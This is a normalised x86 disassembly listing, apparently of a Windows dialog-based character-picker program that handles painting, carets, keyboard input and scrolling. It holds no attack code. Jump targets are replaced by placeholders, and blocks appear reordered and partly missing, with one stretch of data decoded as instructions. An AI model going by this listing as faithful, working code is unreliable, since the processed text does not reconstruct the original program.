push esi
push edi
mov edi ecx
mov esi 0x21
mov edi edi
pop edi
pop esi
mov eax 0x1
pop ebx
retn 0x4
inc esi
cmp esi 0x7e
jle r-xdata
mov eax esi
or eax ebx
push eax
mov ecx edi
call sub_41c8e0
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
sub_41c950
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
cmp edi 0x1
jne r-xdata
push 0x0
push esi
call [ GetWindowLongA@IAT ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
push ecx
push edx
push edi
push esi
mov ecx eax
call sub_41a390
pop edi
pop esi
retn 0x10
mov eax [ rw-data ]
push eax
push 0x0
push esi
call [ SetWindowLongA@IAT ]
sub_41c9b0
movzx eax [ esp + 0x4 ]
cmp eax 0x49e
push esi
mov esi ecx
jg r-xdata
sub eax 0x49f
je r-xdata
je r-xdata
mov ecx [ esi + 0x44 ]
push ecx
mov ecx rw-data
call sub_40d9b0
movsx edx [ esi + 0x1e ]
mov ecx [ esi + 0x14 ]
lea edx [ ecx + edx * 2 ]
push 0x1
push edx
mov ecx eax
call sub_4107e0
mov eax 0x1
pop esi
retn 0x4
sub eax 0x4
je r-xdata
mov ecx [ esi + 0x40 ]
push ecx
mov ecx esi
call sub_4198d0
mov eax 0x1
pop esi
retn 0x4
dec eax
je r-xdata
mov edx [ esi + 0x40 ]
push 0x4a3
push edx
call [ IsDlgButtonChecked@IAT ]
mov [ esi + 0x3e ] ax
mov [ rw-data ] al
sub eax 0x5
jne r-xdata
push 0x1
mov ecx esi
call sub_41a1e0
mov eax 0x1
pop esi
retn 0x4
dec eax
je r-xdata
mov ecx esi
call sub_41c990
xor eax eax
pop esi
retn 0x4
push ebx
xor ecx ecx
call sub_401bd0
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x40 ]
push eax
call [ DestroyWindow@IAT ]
mov eax 0x1
pop esi
retn 0x4
sub eax 0x49b
jne r-xdata
pop ebx
mov eax 0x1
pop esi
retn 0x4
push 0x10
call [ GetKeyState@IAT ]
test ax ax
jl r-xdata
mov eax [ esi ]
call [ eax + 0x4 ]
mov ecx [ esi + 0x48 ]
mov edx [ esi + 0x40 ]
push ecx
push edx
call [ GetDlgItem@IAT ]
push eax
call [ SetFocus@IAT ]
mov eax 0x1
pop esi
retn 0x4
push edi
xor edi edi
cmp [ esi + 0x1a ] di
jle r-xdata
movsx edx [ esi + 0x1e ]
mov eax [ esi + 0x14 ]
lea ecx [ eax + edx * 2 ]
push 0x1
push ecx
mov ecx ebx
call sub_40ee50
pop ebx
mov eax 0x1
pop esi
retn 0x4
pop edi
lea esp [ esp ]
mov edx [ esi + 0x14 ]
push 0x1
lea eax [ edx + edi * 2 ]
push eax
mov ecx ebx
call sub_40ee50
movsx ecx [ esi + 0x1a ]
add edi 0x2
cmp edi ecx
jl r-xdata
sub_41cb10
push esi
push edi
mov esi ecx
call sub_41a150
mov ax [ esp + 0x10 ]
mov edi [ LoadBitmapA@IAT ]
mov [ esi ] r--data
mov [ esi + 0x158 ] ax
mov ecx [ rw-data ]
push 0x34a
push ecx
call edi
mov [ esi + 0x144 ] eax
mov edx [ rw-data ]
push 0x34b
push edx
call edi
mov [ esi + 0x148 ] eax
mov eax [ rw-data ]
push 0x349
push eax
call edi
mov [ esi + 0x140 ] eax
pop edi
mov eax esi
pop esi
retn 0x8
sub_41cba0
push ebx
push esi
mov esi ecx
movsx ebx [ esi + 0x14c ]
movsx ecx [ esi + 0x14e ]
mov eax ebx
cdq
idiv ecx
push edi
mov edi eax
imul ecx edi
xor eax eax
mov ax [ esi + 0x152 ]
sub ebx ecx
movsx ecx [ esi + 0x154 ]
movsx edx ax
add ecx edx
cmp edi ecx
jl r-xdata
movsx edx [ esi + 0x154 ]
cmp edi edx
jge r-xdata
mov ecx edi
sub ecx eax
inc ecx
mov [ esi + 0x154 ] cx
mov ecx esi
call sub_41aa10
mov ecx [ esi + 0x140 ]
movsx eax [ esi + 0x154 ]
mov esi [ esp + 0x10 ]
push 0x16
push 0x16
push ecx
push esi
sub edi eax
call [ CreateCaret@IAT ]
imul edi edi 0x16
imul ebx ebx 0x16
push edi
push ebx
call [ SetCaretPos@IAT ]
push esi
call [ ShowCaret@IAT ]
pop edi
pop esi
pop ebx
retn 0x4
mov ecx esi
mov [ esi + 0x154 ] di
call sub_41aa10
sub_41cc40
push esi
mov esi [ esp + 0x8 ]
mov al [ esi + ecx + 0x4c ]
test al al
sete dl
push edi
mov [ esi + ecx + 0x4c ] dl
mov eax rw-data
movzx edi [ eax + 0x1 ]
cmp esi edi
jne r-xdata
movzx edi [ eax + 0x1 ]
mov [ edi + ecx + 0x4c ] dl
movzx edi [ eax + 0x2 ]
cmp esi edi
jne r-xdata
movzx edi [ eax ]
mov [ edi + ecx + 0x4c ] dl
movzx edi [ eax + 0x3 ]
cmp esi edi
jne r-xdata
movzx edi [ eax + 0x3 ]
mov [ edi + ecx + 0x4c ] dl
movzx edi [ eax + 0x4 ]
cmp esi edi
jne r-xdata
movzx edi [ eax + 0x2 ]
mov [ edi + ecx + 0x4c ] dl
movzx edi [ eax + 0x5 ]
cmp esi edi
jne r-xdata
movzx edi [ eax + 0x5 ]
mov [ edi + ecx + 0x4c ] dl
movzx edi [ eax + 0x6 ]
cmp esi edi
jne r-xdata
movzx edi [ eax + 0x4 ]
mov [ edi + ecx + 0x4c ] dl
movzx edi [ eax + 0x7 ]
cmp esi edi
jne r-xdata
movzx edi [ eax + 0x7 ]
mov [ edi + ecx + 0x4c ] dl
movzx edi [ eax + 0x8 ]
cmp esi edi
jne r-xdata
movzx edi [ eax + 0x6 ]
mov [ edi + ecx + 0x4c ] dl
movzx edi [ eax + 0x9 ]
cmp esi edi
jne r-xdata
movzx edi [ eax + 0x9 ]
mov [ edi + ecx + 0x4c ] dl
movzx edi [ eax + 0xa ]
cmp esi edi
jne r-xdata
movzx edi [ eax + 0x8 ]
mov [ edi + ecx + 0x4c ] dl
movzx edi [ eax + 0xb ]
cmp esi edi
jne r-xdata
movzx edi [ eax + 0xb ]
mov [ edi + ecx + 0x4c ] dl
movzx edi [ eax + 0xc ]
cmp esi edi
jne r-xdata
movzx edi [ eax + 0xa ]
mov [ edi + ecx + 0x4c ] dl
movzx edi [ eax + 0xd ]
cmp esi edi
jne r-xdata
movzx edi [ eax + 0xd ]
mov [ edi + ecx + 0x4c ] dl
movzx edi [ eax + 0xe ]
cmp esi edi
jne r-xdata
movzx edi [ eax + 0xc ]
mov [ edi + ecx + 0x4c ] dl
movzx edi [ eax + 0xf ]
cmp esi edi
jne r-xdata
movzx edi [ eax + 0xf ]
mov [ edi + ecx + 0x4c ] dl
add eax 0x10
cmp eax rw-data
jl r-xdata
movzx edi [ eax + 0xe ]
mov [ edi + ecx + 0x4c ] dl
movzx edi [ eax ]
cmp esi edi
jne r-xdata
xor eax eax
jmp r-xdata
movzx edi [ eax + rw-data ]
cmp esi edi
je r-xdata
movzx eax [ rw-data ]
mov [ eax + ecx + 0x4c ] dl
movzx eax [ rw-data ]
mov [ eax + ecx + 0x4c ] dl
movzx eax [ rw-data ]
mov [ eax + ecx + 0x4c ] dl
call sub_41aa10
pop edi
pop esi
retn 0x4
inc eax
cmp eax 0x3
jl r-xdata
call sub_41aa10
pop edi
pop esi
retn 0x4
sub_41cdc0
push esi
mov esi ecx
movsx eax [ esi + 0x14c ]
movzx eax [ eax + rw-data ]
test eax eax
je r-xdata
pop esi
retn
cmp [ esi + 0x158 ] 0x0
je r-xdata
push eax
mov ecx esi
call sub_41cc40
mov ecx esi
pop esi
jmp sub_41c990
mov cl [ eax + esi + 0x4c ]
test cl cl
je r-xdata
movzx ecx [ eax + rw-data ]
xor eax eax
jmp r-xdata
mov ecx esi
call sub_41cb80
mov ecx esi
call sub_41aa10
mov ecx esi
pop esi
jmp sub_41c990
movzx edx [ eax + rw-data ]
cmp edx ecx
sete dl
mov [ esi + eax + 0x4c ] dl
inc eax
cmp eax 0xf1
jle r-xdata
mov ecx esi
call sub_41aa10
mov ecx esi
pop esi
jmp sub_41c990
sub_41ce50
mov eax [ esp + 0x8 ]
sub esp 0x54
cmp eax 0x100
push ebx
push ebp
push esi
push edi
mov esi ecx
ja r-xdata
cmp eax 0x201
ja r-xdata
je r-xdata
mov ecx eax
sub ecx 0x203
je r-xdata
je r-xdata
push 0x11
call [ GetKeyState@IAT ]
xor ecx ecx
test ax ax
setl cl
xor edx edx
mov eax ecx
mov ecx [ esp + 0x70 ]
test eax eax
setne dl
add ecx 0xffffffdd
cmp ecx 0x4
lea edx [ edx * 4 + 0x1 ]
ja r-xdata
lea ecx [ eax - 0x1 ]
cmp ecx 0x86
ja r-xdata
mov ecx [ esi + 0x40 ]
push 0x0
push 0x1
push 0x111
push ecx
call [ SendMessageA@IAT ]
sub ecx 0x7
je r-xdata
movzx ecx [ esp + 0x74 ]
mov edi [ esi + 0x7c ]
mov eax 0x2e8ba2e9
imul ecx
sar edx 0x2
mov ecx edx
shr ecx 0x1f
add edx ecx
add edx edi
mov ecx esi
mov [ esi + 0x78 ] edx
call sub_41ad80
mov edx [ esp + 0x68 ]
push edx
call [ SetFocus@IAT ]
push 0x1
mov ecx esi
call sub_41ab20
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x54
retn 0x10
mov ecx eax
sub ecx 0x102
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x54
retn 0x10
jmp [ ecx * 4 + jump_table_41d490 ]
mov ecx [ esp + 0x74 ]
mov edx [ esp + 0x70 ]
push ecx
push edx
push eax
mov eax [ esp + 0x74 ]
push eax
call [ DefWindowProcA@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x54
retn 0x10
movzx ecx [ ecx + lookup_table_41d408 ]
jmp [ ecx * 4 + jump_table_41d3f0 ]
push 0x0
lea ecx [ esp + 0x14 ]
push ecx
push 0x0
push 0x68
call [ SystemParametersInfoA@IAT ]
mov ecx [ rw-data ]
mov edi eax
mov eax [ esp + 0x70 ]
movzx edx ax
shr eax 0x10
movsx eax ax
add ecx eax
test dl 0x4
mov [ esp + 0x10 ] edx
mov [ rw-data ] ecx
jne r-xdata
cmp [ esp + 0x70 ] 0x20
jne r-xdata
sub ecx 0x12
jne r-xdata
mov eax [ esi + 0x78 ]
add eax edx
push 0x1
mov ecx esi
mov [ esi + 0x78 ] eax
call sub_41ab20
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x54
retn 0x10
mov eax [ esi + 0x78 ]
sub eax edx
push 0x1
mov ecx esi
mov [ esi + 0x78 ] eax
call sub_41ab20
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x54
retn 0x10
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edi [ esp + 0x68 ]
mov ebx [ esp + 0x74 ]
mov ebp [ GetSystemMetrics@IAT ]
mov [ esi + 0x6c ] edi
mov ecx [ ebx + 0x14 ]
mov eax 0x2e8ba2e9
imul ecx
sar edx 0x2
mov eax edx
shr eax 0x1f
add edx eax
xor eax eax
push 0x1
push 0x2e
mov [ esi + 0x74 ] edx
mov [ esi + 0x7c ] eax
mov [ esi + 0x78 ] eax
call ebp
push 0x3
mov [ esp + 0x70 ] eax
call ebp
mov ecx [ esp + 0x6c ]
lea ecx [ eax + ecx * 2 + 0x16 ]
push ecx
push 0x2d
call ebp
mov edx [ esi + 0x74 ]
mov ecx [ ebx + 0x1c ]
imul edx edx 0xb
add eax edx
shl eax 0x1
push eax
mov eax [ ebx + 0x18 ]
push eax
push ecx
push edi
call [ MoveWindow@IAT ]
push 0x0
push edi
call ImmAssociateContext
push 0x1
mov ecx esi
call sub_41ab20
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x54
retn 0x10
pop edi
pop esi
pop ebp
mov eax 0x81
pop ebx
add esp 0x54
retn 0x10
call [ DestroyCaret@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x54
retn 0x10
mov eax [ esp + 0x68 ]
lea edx [ esp + 0x24 ]
push edx
push eax
call [ BeginPaint@IAT ]
mov edi eax
push edi
call [ CreateCompatibleDC@IAT ]
push 0xffff
mov [ esp + 0x78 ] eax
call [ CreateSolidBrush@IAT ]
mov [ esp + 0x70 ] eax
mov eax [ esi + 0x74 ]
xor ecx ecx
test eax eax
mov [ esp + 0x6c ] ecx
jle r-xdata
push 0x1
mov ecx esi
call sub_41ab20
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x54
retn 0x10
cmp ecx 0x78
jle r-xdata
cmp edi 0xffffffff
je r-xdata
push 0x1
mov ecx esi
call sub_41ab20
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x54
retn 0x10
mov ecx esi
call sub_41ad80
mov eax [ esp + 0x70 ]
movzx ecx ax
cmp ecx 0x5
ja r-xdata
mov edx [ esi + 0x7c ]
push 0x1
mov ecx esi
mov [ esi + 0x78 ] edx
call sub_41ab20
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x54
retn 0x10
push 0x1
mov ecx esi
mov [ esi + 0x78 ] 0x0
call sub_41ab20
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x54
retn 0x10
mov ecx [ esi + 0x7c ]
mov edx [ esi + 0x74 ]
lea eax [ ecx + edx - 0x1 ]
push 0x1
mov ecx esi
mov [ esi + 0x78 ] eax
call sub_41ab20
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x54
retn 0x10
mov eax [ esi + 0x80 ]
push 0x1
mov ecx esi
mov [ esi + 0x78 ] eax
call sub_41ab20
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x54
retn 0x10
mov eax [ esp + 0x70 ]
push eax
call [ DeleteObject@IAT ]
mov ecx [ esp + 0x74 ]
push ecx
call [ DeleteDC@IAT ]
mov eax [ esp + 0x68 ]
lea edx [ esp + 0x24 ]
push edx
push eax
call [ EndPaint@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x54
retn 0x10
mov ebx 0x16
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jle r-xdata
lea edx [ ecx - 0x79 ]
mov eax 0x88888889
mul edx
mov ebx [ esi + 0x74 ]
mov edi [ esi + 0x78 ]
shr edx 0x6
inc edx
mov eax edx
imul eax eax 0xffffff88
add ecx eax
mov [ rw-data ] ecx
cmp ecx 0x78
jle r-xdata
jmp [ ecx * 4 + jump_table_41d4a4 ]
push eax
mov ecx esi
call sub_41aa90
mov ebp eax
mov eax [ esi + 0x68 ]
movzx ecx [ eax + ebp ]
cmp [ esi + 0x4c ] ecx
jne r-xdata
lea ecx [ ebx - 0x16 ]
push 0x2
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x24 ] 0x16
mov [ esp + 0x18 ] ecx
mov [ esp + 0x20 ] ebx
call [ GetStockObject@IAT ]
push eax
lea edx [ esp + 0x18 ]
push edx
push edi
call [ FillRect@IAT ]
jmp r-xdata
mov ebx [ esi + 0x74 ]
mov edi [ esi + 0x78 ]
nop
sub edi ebx
dec edx
jne r-xdata
mov [ esi + 0x78 ] edi
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jle r-xdata
lea edx [ ecx - 0x79 ]
mov eax 0x88888889
mul edx
mov ebx [ esi + 0x78 ]
shr edx 0x6
inc edx
mov eax edx
imul eax eax 0xffffff88
add ecx eax
mov [ rw-data ] ecx
inc [ esi + 0x78 ]
jmp r-xdata
mov eax [ esi + 0x78 ]
mov ecx [ esi + 0x74 ]
add eax ecx
mov [ esi + 0x78 ] eax
jmp r-xdata
dec [ esi + 0x78 ]
jmp r-xdata
mov eax [ esi + 0x78 ]
mov edx [ esi + 0x74 ]
sub eax edx
mov [ esi + 0x78 ] eax
jmp r-xdata
mov edx [ esi + 0x7c ]
mov ecx [ esi + 0x78 ]
shr eax 0x10
sub eax edx
add ecx eax
mov [ esi + 0x78 ] ecx
push 0x1
call [ GetStockObject@IAT ]
push eax
push edi
call [ SelectObject@IAT ]
mov edx [ esp + 0x70 ]
push edx
push edi
call [ SelectObject@IAT ]
mov [ esp + 0x70 ] eax
jmp r-xdata
mov ecx [ esp + 0x6c ]
mov eax [ esi + 0x74 ]
inc ecx
add ebx 0x16
cmp ecx eax
mov [ esp + 0x6c ] ecx
jl r-xdata
add ecx 0x78
mov eax ecx
cdq
xor eax edx
sub eax edx
add edi ebx
cmp eax 0x78
jg r-xdata
mov [ esi + 0x78 ] edi
mov [ rw-data ] ecx
mov ebx [ esi + 0x78 ]
mov edi edi
sub ebx edi
dec edx
jne r-xdata
mov [ esi + 0x78 ] ebx
push 0x1
mov ecx esi
call sub_41ab20
mov eax [ esp + 0x68 ]
push eax
call [ SetFocus@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x54
retn 0x10
mov edx [ esp + 0x70 ]
push edx
push edi
call [ SelectObject@IAT ]
mov [ esp + 0x70 ] eax
push 0x16
push ebx
push 0x0
lea eax [ ebx - 0x16 ]
push eax
push edi
call [ Rectangle@IAT ]
push 0x0
push edi
call [ SetTextColor@IAT ]
mov ecx [ esi + 0x60 ]
mov edx [ esp + 0x74 ]
push ecx
push edx
call [ SelectObject@IAT ]
mov ecx [ esp + 0x74 ]
push 0x8800c6
mov eax ebp
shl eax 0x4
push eax
push 0x0
push ecx
push 0x10
push 0x10
push 0x3
lea edx [ ebx - 0x13 ]
push edx
push edi
call [ BitBlt@IAT ]
mov eax [ esi + 0x68 ]
movzx ecx [ eax + ebp ]
cmp [ esi + 0x4c ] ecx
jne r-xdata
mov eax [ esi + 0x7c ]
add eax ecx
cmp eax [ esi + 0x80 ]
jl r-xdata
add ecx 0x78
mov eax ecx
cdq
xor eax edx
sub eax edx
add ebx edi
cmp eax 0x78
jg r-xdata
mov [ rw-data ] ecx
push 0x1
mov ecx esi
mov [ esi + 0x78 ] ebx
call sub_41ab20
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x54
retn 0x10
sub_41d4c0
mov eax [ esp + 0x8 ]
cmp eax 0x4e
push esi
push edi
mov esi ecx
je r-xdata
cmp [ esp + 0x14 ] 0x657
jne r-xdata
cmp eax 0x111
je r-xdata
pop edi
mov eax 0x1
pop esi
retn 0x10
mov ecx esi
call sub_41aad0
mov ecx [ esp + 0x18 ]
mov edi [ ecx + 0x10 ]
mov ecx [ esi + 0x84 ]
sub eax edi
cmp eax ecx
jle r-xdata
mov edi [ esp + 0x14 ]
movzx eax di
add eax 0xfffff9ac
cmp eax 0x8
ja r-xdata
pop edi
xor eax eax
pop esi
retn 0x10
test eax eax
jge r-xdata
xor eax eax
push eax
mov ecx esi
call sub_41ac20
pop edi
mov eax 0x1
pop esi
retn 0x10
push edi
mov ecx esi
call sub_41c9b0
pop edi
pop esi
retn 0x10
movzx eax [ eax + lookup_table_41d604 ]
jmp [ eax * 4 + jump_table_41d5f4 ]
push eax
mov ecx esi
call sub_41ac20
mov eax ecx
mov ecx [ esp + 0xc ]
push 0x65c
push ecx
call [ IsDlgButtonChecked@IAT ]
neg eax
sbb al al
inc al
mov [ rw-data ] al
mov ecx [ esi + 0x50 ]
lea edx [ ecx + ecx * 2 ]
mov ecx [ esi + 0x54 ]
lea ecx [ ecx + edx * 2 ]
movzx edx al
movzx eax [ edx + ecx ]
mov [ esi + 0x80 ] eax
je r-xdata
shr edi 0x10
cmp edi 0x300
jne r-xdata
mov eax edi
shr eax 0x10
cmp eax 0x300
jne r-xdata
mov cl [ ecx + 0x2 ]
mov cl [ ecx + 0x3 ]
jmp r-xdata
mov ecx esi
call sub_41ad10
pop edi
mov eax 0x1
pop esi
retn 0x10
movzx ecx cl
mov [ esi + 0x84 ] ecx
push 0x0
mov ecx esi
call sub_41ab20
mov edx [ esi + 0x6c ]
push 0x0
push 0x0
push edx
call [ InvalidateRect@IAT ]
push edi
mov ecx esi
call sub_41c9b0
pop edi
pop esi
retn 0x10
sub_41d608
add [ ebx ] eax
add [ ebx ] eax
add dl [ eax - 0x74a96f70 ]
int1
mov eax [ esi + 0x58 ]
test eax eax
je r-xdata
push 0x0
push 0x654
mov ecx esi
call sub_41a840
push 0x0
push 0x658
mov ecx esi
call sub_41a840
mov ecx esi
call sub_41ad10
push 0x0
mov ecx esi
call sub_41ac20
mov ecx esi
pop esi
jmp sub_41a180
push 0x0
push 0x65a
call sub_41a840
sub_41d690
push esi
push edi
mov edi [ esp + 0xc ]
push 0x0
push 0x0
mov esi ecx
mov eax [ esi + 0x40 ]
push edi
push eax
call [ GetDlgItemInt@IAT ]
cmp eax 0xa
jne r-xdata
pop edi
pop esi
retn 0x4
push eax
push edi
mov ecx esi
call sub_41b350
sub_41d6c0
push esi
push edi
mov edi ecx
mov esi 0x604
mov [ edi + 0x4c ] esi
lea esp [ esp ]
push 0xa
push esi
mov ecx edi
call sub_41b350
add esi 0x2
cmp esi 0x60c
jle r-xdata
mov ecx edi
pop edi
pop esi
jmp sub_41a180
sub_41d6f0
sub esp 0x298
push ebx
push ebp
mov ebp [ GetDlgItemInt@IAT ]
push esi
push edi
mov ebx ecx
mov [ esp + 0x2a0 ] 0xffffffff
lea edi [ esp + 0x18 ]
mov esi 0x604
mov [ edi + 0x4 ] eax
mov [ edi ] eax
mov [ edi ] 0x0
mov [ edi + 0x4 ] 0x9
jmp r-xdata
mov ecx [ ebx + 0x40 ]
push 0x0
lea eax [ esp + 0x18 ]
push eax
push esi
push ecx
call ebp
mov ecx [ esp + 0x14 ]
test ecx ecx
jne r-xdata
mov edx [ ebx + 0x40 ]
push edx
lea ecx [ esp + 0x44 ]
call sub_415ea0
test eax eax
jne r-xdata
add esi 0x2
add edi 0x8
cmp esi 0x60e
jl r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x298
retn
mov [ esp + 0x10 ] 0x3000
jmp r-xdata
mov ebp 0x21
mov ecx ebx
push esi
call sub_419a00
mov ecx ebx
push 0x2f
call sub_419a00
movsx eax [ esp + 0x284 ]
shr edi 0x18
and edi 0xf
push edi
push eax
lea ecx [ esp + 0x20 ]
push ecx
mov ecx ebx
call sub_41b3a0
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
mov esi ebp
or esi eax
push 0x2
push esi
lea ecx [ esp + 0x48 ]
call sub_415a70
mov edi [ esp + 0x256 ]
mov eax edi
shr eax 0x14
mov ecx edi
shr ecx 0x6
and eax 0xf
push eax
and ecx 0x3fff
push ecx
lea edx [ esp + 0x20 ]
push edx
mov ecx ebx
call sub_41b3a0
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
add eax 0x100
cmp eax 0x7400
mov [ esp + 0x10 ] eax
jle r-xdata
inc ebp
cmp ebp 0x7e
jle r-xdata
lea ecx [ esp + 0x40 ]
call sub_415190
sub_41d820
push esi
push edi
mov edi [ CheckDlgButton@IAT ]
push 0x1
mov esi ecx
mov eax [ esi + 0x40 ]
push 0x4a0
push eax
call edi
mov ecx [ esi + 0x40 ]
push 0x0
push 0x4a2
push ecx
call edi
mov edx [ esi + 0x40 ]
push 0x0
push 0x4a1
push edx
call edi
push 0x0
push 0x4a6
mov ecx esi
call sub_41a840
mov ecx esi
call sub_41cb80
pop edi
mov ecx esi
pop esi
jmp sub_41a180
sub_41d870
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
push edi
mov [ esi + 0x8 ] di
call sub_41c8e0
test eax eax
je r-xdata
pop edi
pop esi
retn 0x8
push ebx
mov ebx 0x1
mov eax edi
push ebx
sar eax 0x8
sub eax 0x21
push rw-data
mov [ rw-data ] 0x53
mov [ rw-data ] ebx
mov [ rw-data ] eax
mov ecx [ esi + 0xc ]
push ebx
push ecx
call [ SetScrollInfo@IAT ]
mov edx [ esi + 0xc ]
push 0x0
push 0x0
push edx
call [ InvalidateRect@IAT ]
mov [ esi + 0x14 ] ebx
mov ebx [ esp + 0x14 ]
cmp ebx 0x4ba
je r-xdata
cmp ebx 0x4bb
je r-xdata
push edi
push 0x4ba
mov ecx esi
call sub_41c8a0
cmp ebx 0x4bc
je r-xdata
mov eax edi
or eax 0x8080
push eax
push 0x4bb
mov ecx esi
call sub_41c8a0
cmp ebx 0x4bd
pop ebx
je r-xdata
push edi
call sub_4186e0
add esp 0x4
push eax
push 0x4bc
mov ecx esi
call sub_41c8a0
mov [ esi + 0x14 ] 0x0
push edi
call sub_418730
add esp 0x4
push eax
push 0x4bd
mov ecx esi
call sub_41c8a0
sub_41d950
sub esp 0x64
mov eax [ esp + 0x6c ]
cmp eax 0x115
push ebx
push ebp
push esi
mov ebp ecx
push edi
mov [ esp + 0x10 ] ebp
ja r-xdata
lea ecx [ eax - 0x201 ]
cmp ecx 0x9
ja r-xdata
je r-xdata
mov edx [ esp + 0x84 ]
mov ecx [ esp + 0x80 ]
push edx
mov edx [ esp + 0x7c ]
push ecx
push eax
push edx
call [ DefWindowProcA@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x64
retn 0x10
mov edi [ esp + 0x78 ]
jmp [ ecx * 4 + jump_table_41e048 ]
mov eax [ esp + 0x80 ]
movzx ecx ax
cmp ecx 0x5
ja r-xdata
cmp eax 0x87
ja r-xdata
mov eax [ esp + 0x80 ]
mov esi [ esp + 0x78 ]
mov edi [ SendMessageA@IAT ]
shr eax 0x10
movsx ecx ax
mov eax [ rw-data ]
add eax ecx
cmp eax 0x78
mov [ rw-data ] eax
jle r-xdata
mov edx [ ebp ]
push 0x0
push 0x4bf
push 0x111
push edx
call [ SendMessageA@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x64
retn 0x10
call [ ReleaseCapture@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x64
retn 0x10
push edi
call [ SetCapture@IAT ]
mov ebx 0x4
jmp r-xdata
mov bl [ esp + 0x80 ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x64
retn 0x10
jmp [ ecx * 4 + jump_table_41dfd8 ]
mov ecx eax
sub ecx 0x100
je r-xdata
je r-xdata
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jle r-xdata
push 0x0
push 0x21
push 0x100
push esi
call edi
mov eax [ rw-data ]
sub eax 0x78
cmp eax 0x78
mov [ rw-data ] eax
jg r-xdata
mov esi [ esp + 0x84 ]
mov ecx esi
shr ecx 0x10
mov eax 0x2e8ba2e9
imul ecx
xor ecx ecx
mov cx [ ebp + 0x8 ]
sar edx 0x2
mov eax edx
shr eax 0x1f
lea eax [ edx + eax + 0x2 ]
shl eax 0x4
push 0x0
and ecx 0xff00
add eax ecx
mov [ esp + 0x84 ] eax
movzx ecx si
mov eax 0x2e8ba2e9
imul ecx
mov ecx [ esp + 0x84 ]
sar edx 0x2
mov eax edx
add edx ecx
shr eax 0x1f
add eax edx
push eax
mov ecx ebp
call sub_41d870
push edi
call [ SetFocus@IAT ]
push 0x12
call [ GetKeyState@IAT ]
test ax ax
jl r-xdata
mov ecx [ ebp ]
push 0x0
push 0x4be
push 0x111
push ecx
call [ SendMessageA@IAT ]
test bl 0x4
je r-xdata
mov ebx 0x22
jmp r-xdata
mov ebx 0x21
jmp r-xdata
xor ecx ecx
mov cl [ ebp + 0x8 ]
shr eax 0x10
add eax 0x21
shl eax 0x8
push 0x0
and ecx 0xff
or eax ecx
movzx edx ax
push edx
mov ecx ebp
mov [ ebp + 0x8 ] ax
call sub_41d870
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x64
retn 0x10
mov ebx [ esp + 0x80 ]
sub ecx 0x2
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x81
pop ebx
add esp 0x64
retn 0x10
mov ecx eax
dec ecx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x64
retn 0x10
jmp r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x64
retn 0x10
push 0x11
call [ GetKeyState@IAT ]
movzx edi [ ebp + 0x8 ]
xor ecx ecx
test ax ax
setl cl
mov esi edi
lea eax [ ebx - 0x21 ]
and esi 0xff
and edi 0xff00
cmp eax 0x28
lea ecx [ ecx * 4 + 0x1 ]
ja r-xdata
movzx edx [ eax + lookup_table_41e01c ]
jmp [ edx * 4 + jump_table_41dff0 ]
cmp [ esp + 0x80 ] 0x20
je r-xdata
mov esi [ GetSystemMetrics@IAT ]
push 0x1
push 0x2e
call esi
lea eax [ eax + eax + 0x84 ]
push eax
push 0x2d
call esi
push 0x2
mov edi eax
call esi
mov esi [ esp + 0x80 ]
lea ecx [ eax + edi * 2 + 0x160 ]
mov eax [ esp + 0x8c ]
mov edx [ eax + 0x18 ]
mov eax [ eax + 0x1c ]
push ecx
push edx
push eax
push esi
call [ MoveWindow@IAT ]
push 0x0
push esi
call ImmAssociateContext
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x64
retn 0x10
sub ecx 0xe
je r-xdata
push 0x0
push 0x22
push 0x100
push esi
call edi
mov eax [ rw-data ]
add eax 0x78
mov [ rw-data ] eax
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jg r-xdata
add esi ecx
jmp r-xdata
sub esi ecx
cmp esi 0x20
jle r-xdata
cmp ecx 0x1
mov esi 0x21
je r-xdata
cmp ecx 0x1
mov esi 0x7e
je r-xdata
sub esi 0x10
cmp esi 0x20
jle r-xdata
cmp edi 0x2100
je r-xdata
add esi 0x10
cmp esi 0x7f
jge r-xdata
cmp edi 0x7400
je r-xdata
mov edx [ ebp ]
push 0x0
push 0x4c1
push 0x111
push edx
jmp r-xdata
mov eax [ ebp ]
push 0x0
push 0x4be
push 0x111
